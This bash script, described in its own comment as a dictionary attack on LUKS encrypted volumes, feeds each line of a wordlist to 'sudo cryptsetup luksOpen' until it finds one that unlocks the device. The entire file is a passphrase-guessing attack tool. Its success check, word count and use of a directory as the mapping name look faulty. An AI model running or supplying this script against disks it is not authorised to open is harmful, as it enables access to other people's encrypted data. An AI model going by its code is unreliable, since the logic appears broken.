#! /bin/bash
#script to do a dictionary attack on LUKS

#read input
echo Please enter LUKS volume full path 
echo using format "/dev/device" and press enter:
read path 

echo ""
echo Enter a temporary directory name to
echo "mount" the LUKS volume and press enter:
read tempDir

if [ -d $tempDir ]
then
	echo ""
else
	mkdir $tempDir
fi

echo ""
echo Enter a wordlist path"/"name and press enter:
read words
echo ""
#end read input



#do a while until output reads Key slot 0 unlocked.
# or at least contains the text unlocked

#initilize variables
locked="TRUE"
lineNum=1
numberOfWords=`wc -w $words`

while [[ $locked == "TRUE" ]];
do
try=`sed -n "$lineNum"p $words`
echo Trying $try, $lineNum of $numberOfWords
result=`echo $try | sudo cryptsetup luksOpen $path $tempDir`

if [[ $result =~ "unlocked" ]]
then
	echo ""
	echo SUCCESS"!!!"
	echo password is $try
	let locked="FALSE"
fi

let lineNum=lineNum+1
echo ""

if [[ $try == "" ]]
then
	echo Password not found. 
	let locked="FALSE"
fi
done





